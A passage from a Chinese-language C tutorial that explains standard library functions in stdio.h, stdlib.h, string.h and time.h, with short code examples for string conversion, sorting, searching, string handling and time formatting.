输出 x = 12 and y = 3.20logger(&quot;x = %d and y = %.2f&quot;, x, y); （2）输入函数 下面是scanf()的变体函数，用于按照给定格式，输入可变参数列表 (va_list)。 vscanf()：按照给定格式，从控制台读取（默认为键盘）。 vfscanf()：按照给定格式，从文件读取。 vsscanf()：按照给定格式，从字符串读取。 它们的原型如下，跟对应的scanf()函数基本一致，除了最后一个参数是可变参数对象。 12345678910111213141516171819#include &lt;stdio.h&gt;#include &lt;stdarg.h&gt; int vscanf( const char * restrict format, va_list arg); int vfscanf( FILE * restrict stream, const char * restrict format, va_list arg); int vsscanf( const char * restrict s, const char * restrict format, va_list arg); 它们返回成功读取的项数，遇到文件结尾或错误，则返回 EOF。 下面是一个例子。 12345678910111213int error_check_scanf(int expected_count, char *format, ...) { va_list va; va_start(va, format); int count = vscanf(format, va); va_end(va); assert(count == expected_count); return count;}error_check_scanf(3, &quot;%d, %d/%f&quot;, &amp;a, &amp;b, &amp;c); stdlib.h类型别名和宏stdlib.h 定义了下面的类型别名。 size_t：sizeof 的返回类型。 wchar_t：宽字符类型。 stdlib.h 定义了下面的宏。 NULL：空指针。 EXIT_SUCCESS：函数运行成功时的退出状态。 EXIT_FAILURE：函数运行错误时的退出状态。 RAND_MAX：rand() 函数可以返回的最大值。 MB_CUR_MAX：当前语言环境中，多字节字符占用的最大字节数。 abs()，labs()，llabs()这三个函数用于计算整数的绝对值。abs()用于 int 类型，labs()用于 long int 类型，llabs()用于 long long int 类型。 123int abs(int j);long int labs(long int j);long long int llabs(long long int j); 下面是用法示例。 12345// 输出 |-2| = 2printf(&quot;|-2| = %d\\n&quot;, abs(-2));// 输出 |4| = 4printf(&quot;|4| = %d\\n&quot;, abs(4)); div()，ldiv()，lldiv()这三个函数用来计算两个参数的商和余数。div()用于 int 类型的相除，ldiv()用于 long int 类型的相除，lldiv()用于 long long int 类型的相除。 123div_t div(int numer, int denom);ldiv_t ldiv(long int numer, long int denom);lldiv_t lldiv(long long int numer, long long int denom); 这些函数把第2个参数（分母）除以第1个参数（分子），产生商和余数。这两个值通过一个数据结构返回，div()返回 div_t 结构，ldiv()返回 ldiv_t 结构，lldiv()返回 lldiv_t 结构。 这些结构都包含下面两个字段， 12int quot; // 商int rem; // 余数 它们完整的定义如下。 1234567891011typedef struct { int quot, rem;} div_t; typedef struct { long int quot, rem;} ldiv_t; typedef struct { long long int quot, rem;} lldiv_t; 下面是一个例子。 1234567div_t d = div(64, -7);// 输出 64 / -7 = -9printf(&quot;64 / -7 = %d\\n&quot;, d.quot);// 输出 64 % -7 = 1printf(&quot;64 %% -7 = %d\\n&quot;, d.rem); 字符串转成数值a 系列函数stdlib.h定义了一系列函数，可以将字符串转为数组。 atoi()：字符串转成 int 类型。 atof()：字符串转成 double 类型。 atol()：字符串转成 long int 类型。 atoll()：字符串转成 long long int 类型。 它们的原型如下。 1234int atoi(const char* nptr);double atof(const char* nptr);long int atol(const char* nptr);long long int atoll(const char* nptr); 上面函数的参数都是一个字符串指针，字符串开头的空格会被忽略，转换到第一个无效字符处停止。函数名称里面的a代表 ASCII，所以atoi()的意思是“ASCII to int”。 它们返回转换后的数值，如果字符串无法转换，则返回0。 下面是用法示例。 12atoi(&quot;3490&quot;) // 3490atof(&quot;3.141593&quot;) // 3.141593 如果参数是数字开头的字符串，atoi()会只转换数字部分，比如atoi(&quot;42regular&quot;)会返回整数42。如果首字符不是数字，比如“hello world”，则会返回0。 str 系列函数（浮点数转换）stdlib.h还定义了一些更强功能的浮点数转换函数。 strtof()：字符串转成 float 类型。 strtod()：字符串转成 double 类型。 strtold()：字符串转成 long double 类型。 它们的原型如下。 1234567891011121314float strtof( const char* restrict nptr, char** restrict endptr);double strtod( const char* restrict nptr, char** restrict endptr); long double strtold( const char* restrict nptr, char** restrict endptr); 它们都接受两个参数，第一个参数是需要转换的字符串，第二个参数是一个指针，指向原始字符串里面无法转换的部分。 nptr：待转换的字符串（起首的空白字符会被忽略）。 endprt：一个指针，指向不能转换部分的第一个字符。如果字符串可以完全转成数值，该指针指向字符串末尾的终止符\\0。这个参数如果设为 NULL，就表示不需要处理字符串剩余部分。 它们的返回值是已经转换后的数值。如果字符串无法转换，则返回0。如果转换结果发生溢出，errno 会被设置为 ERANGE。如果值太大（无论是正数还是负数），函数返回HUGE_VAL；如果值太小，函数返回零。 1234567char *inp = &quot; 123.4567abdc&quot;;char *badchar;double val = strtod(inp, &amp;badchar);printf(&quot;%f\\n&quot;, val); // 123.456700printf(&quot;%s\\n&quot;, badchar); // abdc 字符串可以完全转换的情况下，第二个参数指向\\0，因此可以用下面的写法判断是否完全转换。 12345if (*endptr == '\\0') { // 完全转换} else { // 存在无法转换的字符} 如果不关心没有转换的部分，则可以将 endptr 设置为 NULL。 这些函数还可以将字符串转换为特殊值 Infinity 和 NaN。如果字符串包含 INF 或 INFINITY（大写或小写皆可），则将转换为 Infinity；如果字符串包含 NAN，则将返回 NaN。 str 系列函数（整数转换）str 系列函数也有整数转换的对应函数。 strtol()：字符串转成 long int 类型。 strtoll()：字符串转成 long long int 类型。 strtoul()：字符串转成 unsigned long int 类型。 strtoull()：字符串转成 unsigned long long int 类型。 它们的原型如下。 12345678910111213141516171819202122long int strtol( const char* restrict nptr, char** restrict endptr, int base); long long int strtoll( const char* restrict nptr, char** restrict endptr, int base); unsigned long int strtoul( const char* restrict nptr, char** restrict endptr, int base); unsigned long long int strtoull( const char* restrict nptr, char** restrict endptr, int base); 它们接受三个参数。 （1）nPtr：待转换的字符串（起首的空白字符会被忽略）。 （2）endPrt：一个指针，指向不能转换部分的第一个字符。如果字符串可以完全转成数值，该指针指向字符串末尾的终止符\\0。这个参数如果设为 NULL，就表示不需要处理字符串剩余部分。 （3）base：待转换整数的进制。这个值应该是2到36之间的整数，代表相应的进制，如果是特殊值0，表示让函数根据数值的前缀，自己确定进制，即如果数字有前缀0，则为八进制，如果数字有前缀0x或0X，则为十六进制。 它们的返回值是转换后的数值，如果转换不成功，返回0。 下面是转换十进制整数的例子。 1234char* s = &quot;3490&quot;;unsigned long int x = strtoul(u, NULL, 10);printf(&quot;%lu\\n&quot;, x); // 3490 下面是转换十六进制整数的例子。 123456789char* end;long value = strtol(&quot;0xff&quot;, &amp;end, 16);printf(&quot;%ld\\n&quot;, value); // 255printf(&quot;%s\\n&quot;, end); // 无内容value = strtol(&quot;0xffxx&quot;, &amp;end, 16);printf(&quot;%ld\\n&quot;, value); // 255printf(&quot;%s\\n&quot;, end); // xx 上面示例中，strtol()可以指定字符串包含的是16进制整数。不能转换的部分，可以使用指针end进行访问。 下面是转换二进制整数的例子。 1234char* s = &quot;101010&quot;;unsigned long int x = strtoul(s, NULL, 2);printf(&quot;%lu\\n&quot;, x); // 42 下面是让函数自行判断整数进制的例子。 12345678910111213141516#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;int main(void) { const char* string = &quot;-1234567abc&quot;; char* remainderPtr; long x = strtol(string, &amp;remainderPtr, 0); printf(&quot;%s\\&quot;%s\\&quot;\\n%s%ld\\n%s\\&quot;%s\\&quot;\\n&quot;, &quot;The original string is &quot;, string, &quot;The converted value is &quot;, x, &quot;The remainder of the original string is &quot;, remainderPtr );} 上面代码的输出结果如下。 123The original string is &quot;-1234567abc&quot;The converted value is -1234567The remainder of the original string is &quot;abc&quot; 如果被转换的值太大，strtol()函数在errno中存储ERANGE这个值，并返回LONG_MIN（原值为负数）或LONG_MAX（原值为正数），strtoul()则返回ULONG_MAX。 rand()rand()函数用来生成 0～RAND_MAX 之间的随机整数。RAND_MAX是一个定义在stdlib.h里面的宏，通常等于 INT_MAX。 12345// 原型int rand(void);// 示例int x = rand(); 如果希望获得整数 N 到 M 之间的随机数（包括 N 和 M 两个端点值），可以使用下面的写法。 1int x = rand() % （M - N + 1) + N; 比如，1 到 6 之间的随机数，写法如下。 1int x = rand() % 6 + 1; 获得浮点数的随机值，可以使用下面的写法。 123456// 0 到 0.999999 之间的随机数printf(&quot;0 to 0.99999: %f\\n&quot;, rand() / ((float)RAND_MAX + 1));// n 到 m 之间的随机数：// n + m * (rand() / (float)RAND_MAX)printf(&quot;10.5 to 15.7: %f\\n&quot;, 10.5 + 5.2 * rand() / (float)RAND_MAX); 上面示例中，由于rand()和RAND_MAX都是 int 类型，要用显示的类型转换转为浮点数。 srand()rand()是伪随机数函数，为了增加随机性，必须在调用它之前，使用srand()函数重置一下种子值。 srand()函数接受一个无符号整数（unsigned int）作为种子值，没有返回值。 1void srand(unsigned int seed); 通常使用time(NULL)函数返回当前距离时间纪元的秒数，作为srand()的参数。 12#include &lt;time.h&gt;srand((unsigned int) time(NULL)); 上面代码中，time()的原型定义在头文件time.h里面，返回值的类型是类型别名time_t，具体的类型与系统有关，所以要强制转换一下类型。time()的参数是一个指针，指向一个具体的 time_t 类型的时间值，这里传入空指针NULL作为参数，由于 NULL 一般是0，所以也可以写成time(0)。 abort()abort()用于不正常地终止一个正在执行的程序。使用这个函数的目的，主要是它会触发 SIGABRT 信号，开发者可以在程序中为这个信号设置一个处理函数。 1void abort(void); 该函数没有参数。 exit()，quick_exit()，_Exit()这三个函数都用来退出当前正在执行的程序。 123void exit(int status);void quick_exit(int status);void _Exit(int status); 它们都接受一个整数，表示程序的退出状态，0是正常退出，非零值表示发生错误，可以使用宏EXIT_SUCCESS和EXIT_FAILURE当作参数。它们本身没有返回值。 它们的区别是，退出时所做的清理工作不同。exit()是正常退出，系统会做完整的清理，比如更新所有文件流，并且删除临时文件。quick_exit()是快速退出，系统的清理工作稍微少一点。_Exit()是立即退出，不做任何清理工作。 下面是一些用法示例。 123exit(EXIT_SUCCESS);quick_exit(EXIT_FAILURE);_Exit(2); atexit()，at_quick_exit()atexit()用来登记当前程序退出时（调用exit()或main()正常退出），所要执行的其他函数。 at_quick_exit()则是登记使用quick_exit()方法退出当前程序时，所要执行的其他函数。 exit()只能触发atexit()登记的函数，quick_exit()只能触发at_quick_exit()登记的函数。 12int atexit(void (*func)(void));int at_quick_exit(void (*func)(void)); 它们的参数是要执行的函数地址，即函数名。它们的返回值都是调用成功时返回0，调用失败时返回非零值。 下面是一个例子。 1234567891011121314151617181920212223242526void sign_off(void);void too_bad(void);int main(void) { int n; atexit(sign_off); /* 注册 sign_off()函数 */ puts(&quot;Enter an integer:&quot;); if (scanf(&quot;%d&quot;, &amp;n) != 1) { puts(&quot;That's no integer!&quot;); atexit(too_bad); /* 注册 too_bad()函数 */ exit(EXIT_FAILURE); } printf(&quot;%d is %s.\\n&quot;, n, (n % 2 == 0) ? &quot;even&quot; : &quot;odd&quot;); return 0;}void sign_off(void) { puts(&quot;sign_off&quot;);}void too_bad(void) { puts(&quot;too bad&quot;);} 上面示例中，用户输入失败时，会调用sign_off()和too_bad()函数；但是输入成功时只会调用sign_off()。因为只有输入失败时，才会进入if语句登记too_bad()。 另外，如果有多条atexit()语句，函数退出时最先调用的，是最后一个登记的函数。 atexit()登记的函数（如上例的sign_off和too_bad）应该不带任何参数且返回类型为void。通常，这些函数会执行一些清理任务，例如删除临时文件或重置环境变量。 at_quick_exit()也是同样的规则，下面是一个例子。 12345678910111213void exit_handler_1(void) { printf(&quot;1\\n&quot;);}void exit_handler_2(void) { printf(&quot;2\\n&quot;);}int main(void) { at_quick_exit(exit_handler_1); at_quick_exit(exit_handler_2); quick_exit(0);} 执行上面的示例，命令行会先输出2，再输出1。 getenv()getenv()用于获取环境变量的值。环境变量是操作系统提供的程序之外的一些环境参数。 1char* getenv(const char* name); 它的参数是一个字符串，表示环境变量名。返回值也是一个字符串，表示环境变量的值。如果指定的环境变量不存在，则返回 NULL。 下面是输出环境变量$PATH的值的例子。 1printf(&quot;PATH is %s\\n&quot;, getenv(&quot;PATH&quot;)); system()system()函数用于执行外部程序。它会把它的参数字符串传递给操作系统，让操作系统的命令处理器来执行。 1void system( char const * command ); 这个函数的返回值因编译器而异。但是标准规定，如果 NULL 作为参数，表示询问操作系统，是否有可用的命令处理器，如果有的话，返回一个非零值，否则返回零。 下面是执行ls命令的例子。 1system(&quot;ls -l&quot;); 内存管理函数stdlib.h 提供了一些内存操作函数，下面几个函数详见《内存管理》一章，其余在本节介绍。 malloc()：分配内存区域 calloc()：分配内存区域。 realloc()：调节内存区域大小。 free()：释放内存区域。 aligned_alloc()很多系统有内存对齐的要求，即内存块的大小必须是某个值（比如64字节）的倍数，这样有利于提高处理速度。aligned_alloc()就用于分配满足内存对齐要求的内存块，它的原型如下。 1void* aligned_alloc(size_t alignment, size_t size); 它接受两个参数。 alignment：整数，表示内存对齐的单位大小，一般是2的整数次幂（2、4、8、16……）。 size：整数，表示内存块的大小。 分配成功时，它返回一个无类型指针，指向新分配的内存块。分配失败时，返回 NULL。 1char* p = aligned_alloc(64, 256); 上面示例中，aligned_alloc()分配的内存块，单位大小是64字节，要分配的字节数是256字节。 qsort()qsort()用来快速排序一个数组。它对数组成员的类型没有要求，任何类型数组都可以用这个函数排序。 123456void qsort( void *base, size_t nmemb, size_t size, int (*compar)(const void *, const void *)); 该函数接受四个参数。 base：指向要排序的数组开始位置的指针。 nmemb：数组成员的数量。 size：数组每个成员占用的字节长度。 compar：一个函数指针，指向一个比较两个成员的函数。 比较函数compar将指向数组两个成员的指针作为参数，并比较两个成员。如果第一个参数小于第二个参数，该函数应该返回一个负值；如果两个函数相等，返回0；如果第一个参数大于第二个参数，应该返回一个正数。 下面是一个用法示例。 12345678910111213141516171819#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;int compar(const void* elem0, const void* elem1) { const int* x = elem0; const int* y = elem1; return *x - *y;}int main(void) { int a[9] = {14, 2, 3, 17, 10, 8, 6, 1, 13}; qsort(a, 9, sizeof(int), compar); for (int i = 0; i &lt; 9; i++) printf(&quot;%d &quot;, a[i]); putchar('\\n');} 执行上面示例，会输出排序好的数组“1 2 3 6 8 10 13 14 17”。 bsearch()bsearch()使用二分法搜索，在数组中搜索一个值。它对数组成员的类型没有要求，任何类型数组都可以用这个函数搜索值。 注意，该方法只对已经排序好的数组有效。 1234567void *bsearch( const void* key, const void* base, size_t nmemb, size_t size, int (*compar)(const void *, const void *)); 这个函数接受5个参数。 key：指向要查找的值的指针。 base：指向数组开始位置的指针，数组必须已经排序。 nmemb：数组成员的数量。 size：数组每个成员占用的字节长度。 compar：指向一个将待查找值与其他值进行比较的函数的指针。 比较函数compar将待查找的值作为第一个参数，将要比较的值作为第二个参数。如果第一个参数小于第二个参数，该函数应该返回一个负值；如果两个参数相等，返回0；如果第一个参数大于第二个参数，返回一个正值。 如果找到待查找的值，bsearch()返回指向该值的指针，如果找不到，返回 NULL。 下面是一个用法示例。 123456789101112131415161718192021222324252627#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;int compar(const void *key, const void *value) { const int* k = key; const int* v = value; return *k - *v;}int main(void) { int a[9] = {2, 6, 9, 12, 13, 18, 20, 32, 47}; int* r; int key; key = 12; // 包括在数组中 r = bsearch(&amp;key, a, 9, sizeof(int), compar); printf(&quot;Found %d\\n&quot;, *r); key = 30; // 不包括在数组中 r = bsearch(&amp;key, a, 9, sizeof(int), compar); if (r == NULL) printf(&quot;Didn't find 30\\n&quot;); return 0;} 执行上面的示例，会输出下面的结果。 12Found 12Didn't find 30 多字节字符函数stdlib.h 提供了下面的函数，用来操作多字节字符，详见《多字节字符》一章。 mblen()：多字节字符的字节长度。 mbtowc()：将多字节字符转换为宽字符。 wctomb()：将宽字符转换为多字节字符。 mbstowcs()：将多字节字符串转换为宽字符串。 wcstombs()：将宽字符串转换为多字节字符串。 string.hstring.h主要定义了字符串处理函数和内存操作函数。 字符串处理函数以下字符串处理函数，详见《字符串》一章。 strcpy()：复制字符串。 strncpy()：复制字符串，有长度限制。 strcat()：连接两个字符串。 strncat()：连接两个字符串，有长度限制。 strcmp()：比较两个字符串。 strncmp()：比较两个字符串，有长度限制。 strlen()：返回字符串的字节数。 strchr()，strrchr()strchr()和strrchr()都用于在字符串中查找指定字符。不同之处是，strchr()从字符串开头开始查找，strrchr()从字符串结尾开始查找，函数名里面多出来的那个r表示 reverse（反向）。 12char* strchr(char* str, int c);char* strrchr(char *str, int c); 它们都接受两个参数，第一个参数是字符串指针，第二个参数是所要查找的字符。 一旦找到该字符，它们就会停止查找，并返回指向该字符的指针。如果没有找到，则返回 NULL。 下面是一个例子。 12345char *str = &quot;Hello, world!&quot;;char *p;p = strchr(str, ','); // p 指向逗号的位置p = strrchr(str, 'o'); // p 指向 world 里面 o 的位置 strspn()，strcspn()strspn()用来查找属于指定字符集的字符串长度，strcspn()正好相反，用来查找不属于指定字符集的字符串长度。 12size_t strspn(char* str, const char* accept);size_t strcspn(char *str, const char *reject); 这两个函数接受两个参数，第一个参数是源字符串，第二个参数是由指定字符组成的字符串。 strspn()从第一个参数的开头开始查找，一旦发现第一个不属于指定字符集范围的字符，就停止查找，返回到目前为止的字符串长度。如果始终没有不在指定字符集的字符，则返回第一个参数字符串的长度。 strcspn()则是一旦发现第一个属于指定字符集范围的字符，就停止查找，返回到目前为止的字符串长度。如果始终没有发现指定字符集的字符，则返回第一个参数字符串的长度。 12345678char str[] = &quot;hello world&quot;;int n;n = strspn(str1, &quot;aeiou&quot;);printf(&quot;%d\\n&quot;, n); // n == 0n = strcspn(str1, &quot;aeiou&quot;);printf(&quot;%d\\n&quot;, n); // n == 1 上面示例中，第一个n等于0，因为0号位置的字符h就不属于指定字符集aeiou，可以理解为开头有0个字符属于指定字符集。第二个n等于1，因为1号位置的字符e属于指定字符集aeiou，可以理解为开头有1个字符不属于指定字符集。 strpbrk()strpbrk()在字符串中搜索指定字符集的任一个字符。 1char* strpbrk(const char* s1, const char* s2); 它接受两个参数，第一个参数是源字符串，第二个参数是由指定字符组成的字符串。 它返回一个指向第一个匹配字符的指针，如果未找到匹配字符，则返回 NULL。 123456char* s1 = &quot;Hello, world!&quot;;char* s2 = &quot;dow!&quot;;char* p = strpbrk(s1, s2);printf(&quot;%s\\n&quot;, p); // &quot;o, world!&quot; 上面示例中，指定字符集是“dow!”，那么s1里面第一个匹配字符是“Hello”的“o”，所以指针p指向这个字符。输出的话，就会输出从这个字符直到字符串末尾的“o, world!”。 strstr()strstr()在一个字符串里面，查找另一个字符串。 1234char *strstr( const char* str, const char* substr); 它接受两个参数，第一个参数是源字符串，第二个参数是所要查找的子字符串。 如果匹配成功，就返回一个指针，指向源字符串里面的子字符串。如果匹配失败，就返回 NULL，表示无法找到子字符串。 1234char* str = &quot;The quick brown fox jumped over the lazy dogs.&quot;;char* p = strstr(str, &quot;lazy&quot;);printf(&quot;%s\\n&quot;, p == NULL ? &quot;null&quot;: p); // &quot;lazy dogs.&quot; 上面示例中，strstr()用来在源字符串str里面，查找子字符串lazy。从返回的指针到字符串结尾，就是“lazy dogs.”。 strtok()strtok()用来将一个字符串按照指定的分隔符（delimiter），分解成一系列词元（tokens）。 1char* strtok(char* str, const char* delim); 它接受两个参数，第一个参数是待拆分的字符串，第二个参数是指定的分隔符。 它返回一个指针，指向分解出来的第一个词元，并将词元结束之处的分隔符替换成字符串结尾标志\\0。如果没有待分解的词元，它返回 NULL。 如果要遍历所有词元，就必须循环调用，参考下面的例子。 strtok()的第一个参数如果是 NULL，则表示从上一次strtok()分解结束的位置，继续往下分解。 123456789101112#include &lt;stdio.h&gt;#include &lt;string.h&gt;int main(void) { char string[] = &quot;This is a sentence with 7 tokens&quot;; char* tokenPtr = strtok(string, &quot; &quot;); while (tokenPtr != NULL) { printf(&quot;%s\\n&quot;, tokenPtr); tokenPtr = strtok(NULL, &quot; &quot;); }} 上面示例将源字符串按照空格，分解词元。它的输出结果如下。 1234567Thisisasentencewith7tokens 注意，strtok()会修改原始字符串，将所有分隔符都替换成字符串结尾符号\\0。因此，最好生成一个原始字符串的拷贝，然后再对这个拷贝执行strtok()。 strcoll()strcoll()用于比较两个启用了本地化设置的字符串，用法基本与strcmp()相同。 1int strcoll(const char *s1, const char *s2); 请看下面的示例。 1234567setlocale(LC_ALL, &quot;&quot;);// 报告 é &gt; fprintf(&quot;%d\\n&quot;, strcmp(&quot;é&quot;, &quot;f&quot;)); // 报告 é &lt; fprintf(&quot;%d\\n&quot;, strcoll(&quot;é&quot;, &quot;f&quot;)); 上面示例比较带重音符号的é与f，strcmp()会返回é大于f，而strcoll()就会正确识别é排在f前面，所以小于f。注意，在比较之前，需要使用setlocale(LC_ALL, &quot;&quot;)，启用本地化设置。 strxfrm()strxfrm()将一个本地化字符串转成可以使用strcmp()进行比较的形式，相当于strcoll()内部的第一部分操作。 12345size_t strxfrm( char * restrict s1, const char * restrict s2, size_t n); 它接受三个参数，将第二个参数s2转为可以使用strcmp()比较的形式，并将结果存入第一个参数s1。第三个参数n用来限定写入的字符数，防止超出s1的边界。 它返回转换后的字符串长度，不包括结尾的终止符。 如果第一个参数是 NULL，第三个参数是0，则不进行实际的转换，只返回转换后所需的字符串长度。 下面的示例是用这个函数自己实现一个strcoll()。 1234567891011121314151617int my_strcoll(char* s1, char* s2) { int len1 = strxfrm(NULL, s1, 0) + 1; int len2 = strxfrm(NULL, s2, 0) + 1; char *d1 = malloc(len1); char *d2 = malloc(len2); strxfrm(d1, s1, len1); strxfrm(d2, s2, len2); int result = strcmp(d1, d2); free(d2); free(d1); return result;} 上面示例中，先为两个进行比较的本地化字符串，分配转换后的存储空间，使用strxfrm()将它们转为可比较的形式，再用strcmp()进行比较。 strerror()strerror()函数返回特定错误的说明字符串。 1char *strerror(int errornum); 它的参数是错误的编号，由errno.h定义。返回值是一个指向说明字符串的指针。 12// 输出 No such file or directoryprintf(&quot;%s\\n&quot;, strerror(2)); 上面示例输出2号错误的说明字符“No such file or directory“。 下面的例子是自定义报错信息。 123456789101112#include &lt;stdio.h&gt;#include &lt;string.h&gt;#include &lt;errno.h&gt;int main(void) { FILE* fp = fopen(&quot;NONEXISTENT_FILE.TXT&quot;, &quot;r&quot;); if (fp == NULL) { char* errmsg = strerror(errno); printf(&quot;Error %d opening file: %s\\n&quot;, errno, errmsg); }} 上面示例中，通过strerror(errno)拿到当前的默认报错信息，其中errno是errno.h定义的宏，表示当前的报错编号。然后，再输出一条自定义的报错信息。 内存操作函数以下内存操作函数，详见《内存管理》一章。 memcpy()：内存复制函数。 memmove()：内存复制函数（允许重叠）。 memcmp()：比较两个内存区域。 memchr()memchr()用于在内存区域中查找指定字符。 1void* memchr(const void* s, int c, size_t n); 它接受三个参数，第一个参数是内存区域的指针，第二个参数是所要查找的字符，第三个参数是内存区域的字节长度。 一旦找到，它就会停止查找，并返回指向该位置的指针。如果直到检查完指定的字节数，依然没有发现指定字符，则返回 NULL。 下面是一个例子。 1234char *str = &quot;Hello, world!&quot;;char *p;p = memchr(str, '!', 13); // p 指向感叹号的位置 memset()memset()将一段内存全部格式化为指定值。 1void* memset(void* s, int c, size_t n); 它的第一个参数是一个指针，指向内存区域的开始位置，第二个参数是待写入的字符值，第三个参数是一个整数，表示需要格式化的字节数。它返回第一个参数（指针）。 1memset(p, ' ', N); 上面示例中，p 是一个指针，指向一个长度为 N 个字节的内存区域。memset()将该块内存区域的每个字节，都改写为空格字符。 下面是另一个例子。 1234char string1[15] = &quot;BBBBBBBBBBBBBB&quot;;// 输出 bbbbbbbBBBBBBBprintf(&quot;%s\\n&quot;, (char*) memset(string1, 'b', 7)); memset()的一个重要用途，就是将数组成员全部初始化为0。 1memset(arr, 0, sizeof(arr)); 下面是将 Struct 结构都初始化为0的例子。 12345678910111213struct banana { float ripeness; char *peel_color; int grams;};struct banana b;memset(&amp;b, 0, sizeof b);b.ripeness == 0.0; // Trueb.peel_color == NULL; // Trueb.grams == 0; // True 上面示例，将 Struct banana 的实例 b 的所有属性都初始化为0。 其他函数123void* memset(void* a, int c, size_t n);size_t strlen(const char* s); time.htime_ttime_t 是一个表示时间的类型别名，可以视为国际标准时 UTC。它可能是浮点数，也可能是整数，Unix 系统一般是整数。 许多系统上，time_t 表示自时间纪元（time epoch）以来的秒数。Unix 的时间纪元是国际标准时 UTC 的1970年1月1日的零分零秒。time_t 如果为负数，则表示时间纪元之前的时间。 time_t 一般是32位或64位整数类型的别名，具体类型取决于当前系统。如果是32位带符号整数，time_t 可以表示的时间到 2038年1月19日03:14:07 UTC 为止；如果是32位无符号整数，则表示到2106年。如果是64位带符号整数，可以表示-2930亿年到+2930亿年的时间范围。 struct tmstruct tm 是一个数据结构，用来保存时间的各个组成部分，比如小时、分钟、秒、日、月、年等。下面是它的结构。 1234567891011struct tm { int tm_sec; // 秒数 [0, 60] int tm_min; // 分钟 [0, 59] int tm_hour; // 小时 [0, 23] int tm_mday; // 月份的天数 [1, 31] int tm_mon; // 月份 [0, 11]，一月用 0 表示 int tm_year; // 距离 1900 的年数 int tm_wday; // 星期几 [0, 6]，星期天用 0 表示 int tm_yday; // 距离1月1日的天数 [0, 365] int tm_isdst; // 是否采用夏令时，1 表示采用，0 表示未采用}; time()time()函数返回从时间纪元到现在经过的秒数。 1time_t time(time_t* returned_value); time()接受一个 time_t 指针作为参数，返回值会写入指针地址。参数可以是空指针 NULL。 time()的返回值是 time_t 类型的当前时间。 如果计算机无法提供当前的秒数，或者返回值太大，无法用time_t类型表示，time()函数就返回-1。 1234567time_t now;// 写法一 now = time(NULL);// 写法二 time(&amp;now); 上面示例展示了将当前时间存入变量now的两种写法。 如果要知道某个操作耗费的精确时间，需要调用两次time()，再将两次的返回值相减。 1234567time_t begin = time(NULL);// ... 执行某些操作time_t end = time(NULL);printf(&quot;%d\\n&quot;, end - begin); 注意，上面的方法只能精确到秒。 ctime()ctime()用来将 time_t 类型的值直接输出为人类可读的格式。 1char* ctime( time_t const * time_value ); ctime()的参数是一个 time_t 指针，返回一个字符串指针。该字符串的格式类似“Sun Jul 4 04:02:48 1976\\n\\0”，尾部包含换行符和字符串终止标志。 下面是一个例子。 123456time_t now; now = time(NULL);// 输出 Sun Feb 28 18:47:25 2021printf(&quot;%s&quot;, ctime(&amp;now)); 注意，ctime()会在字符串尾部自动添加换行符。 localtime()，gmtime()localtime()函数用来将 time_t 类型的时间，转换为当前时区的 struct tm 结构。 gmtime()函数用来将 time_t 类型的时间，转换为 UTC 时间的 struct tm 结构。 它们的区别就是返回值，前者是本地时间，后者是 UTC 时间。 12struct tm* localtime(const time_t* timer);struct tm* gmtime(const time_t* timer); 下面是一个例子。 1234567time_t now = time(NULL);// 输出 Local: Sun Feb 28 20:15:27 2021printf(&quot;Local: %s&quot;, asctime(localtime(&amp;now)));// 输出 UTC : Mon Mar 1 04:15:27 2021printf(&quot;UTC : %s&quot;, asctime(gmtime(&amp;now))); asctime()asctime()函数用来将 struct tm 结构，直接输出为人类可读的格式。该函数会自动在输出的尾部添加换行符。 用法示例参考上一小节。 mktime()mktime()函数用于把一个 struct tm 结构转换为 time_t 值。 1time_t mktime(struct tm* tm_ptr); mktime()的参数是一个 struct tm 指针。 mktime()会自动设置 struct tm 结构里面的tm_wday属性和tm_yday属性，开发者自己不必填写这两个属性。所以，这个函数常用来获得指定时间是星期几（tm_wday）。 struct tm 结构的tm_isdst属性也可以设为-1，让mktime()决定是否应该采用夏令时。 下面是一个例子。 123456789101112131415161718struct tm some_time = { .tm_year=82, // 距离 1900 的年数 .tm_mon=3, // 月份 [0, 11] .tm_mday=12, // 天数 [1, 31] .tm_hour=12, // 小时 [0, 23] .tm_min=00, // 分钟 [0, 59] .tm_sec=04, // 秒数 [0, 60] .tm_isdst=-1, // 夏令时}; time_t some_time_epoch;some_time_epoch = mktime(&amp;some_time); // 输出 Mon Apr 12 12:00:04 1982printf(&quot;%s&quot;, ctime(&amp;some_time_epoch));// 输出 Is DST: 0printf(&quot;Is DST: %d\\n&quot;, some_time.tm_isdst); difftime()difftime()用来计算两个时间之间的差异。Unix 系统上，直接相减两个 time_t 值，就可以得到相差的秒数，但是为了程序的可移植性，最好还是使用这个函数。 1double difftime( time_t time1, time_t time2 ); difftime()函数接受两个 time_t 类型的时间作为参数，计算 time1 - time2 的差，并把结果转换为秒。 注意它的返回值是 double 类型。 12345678910111213141516171819202122232425262728293031323334#include &lt;stdio.h&gt;#include &lt;time.h&gt; int main(void) { struct tm time_a = { .tm_year=82, .tm_mon=3, .tm_mday=12, .tm_hour=4, .tm_min=00, .tm_sec=04, .tm_isdst=-1, }; struct tm time_b = { .tm_year=120, .tm_mon=10, .tm_mday=15, .tm_hour=16, .tm_min=27, .tm_sec=00, .tm_isdst=-1, }; time_t cal_a = mktime(&amp;time_a); time_t cal_b = mktime(&amp;time_b); double diff = difftime(cal_b, cal_a); double years = diff / 60 / 60 / 24 / 365.2425; // 输出 1217996816.000000 seconds (38.596783 years) between events printf(&quot;%f seconds (%f years) between events\\n&quot;, diff, years);} 上面示例中，折算年份时，为了尽量准确，使用了一年的准确长度 365.2425 天，这样可以抵消闰年的影响。 strftime()strftime()函数用来将 struct tm 结构转换为一个指定格式的字符串，并复制到指定地址。 123456size_t strftime( char* str, size_t maxsize, const char* format, const struct tm* timeptr) strftime()接受四个参数。 第一个参数：目标字符串的指针。 第二个参数：目标字符串可以接受的最大长度。 第三个参数：格式字符串。 第四个参数：struct tm 结构。 如果执行成功（转换并复制），strftime()函数返回复制的字符串长度；如果执行失败，返回-1。 下面是一个例子。 123456789101112131415161718192021222324252627282930#include &lt;stdio.h&gt;#include &lt;time.h&gt;int main(void) { char s[128]; time_t now = time(NULL); // %c: 本地时间 strftime(s, sizeof s, &quot;%c&quot;, localtime(&amp;now)); puts(s); // Sun Feb 28 22:29:00 2021 // %A: 完整的星期日期的名称 // %B: 完整的月份名称 // %d: 月份的天数 strftime(s, sizeof s, &quot;%A, %B %d&quot;, localtime(&amp;now)); puts(s); // Sunday, February 28 // %I: 小时（12小时制） // %M: 分钟 // %S: 秒数 // %p: 